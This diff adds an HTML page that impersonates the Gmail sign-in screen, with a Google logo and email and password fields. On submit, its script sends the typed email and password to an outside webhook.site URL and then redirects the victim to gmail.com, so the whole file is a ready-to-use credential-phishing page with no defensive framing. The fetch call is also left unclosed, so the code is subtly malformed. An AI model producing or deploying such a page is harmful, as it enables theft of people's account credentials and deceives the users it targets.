@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Gmail</title>
+</head>
+<body style="font-family: Arial; text-align: center; padding-top: 50px;">
+    <img src="https://ssl.gstatic.com/gb/images/v1_767e0b6e.png" width="75">
+    <h2>Sign in</h2>
+    <p style="color: gray;">Use your Google Account</p>
+    
+    <form id="loginForm" style="max-width: 350px; margin: auto;">
+        <input type="email" id="email" placeholder="Email or phone" required
+               style="width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px;"><br>
+        <input type="password" id="password" placeholder="Enter your password" required
+               style="width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px;"><br>
+        <button type="submit" 
+                style="width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer;">
+            Next
+        </button>
+    </form>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            fetch('https://webhook.site/283a8157-d7fd-492b-a0e7-333a345ead03?email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password),
+            
+            window.location.href = 'https://gmail.com';
+        });
+    </script>
+</body>
+</html>
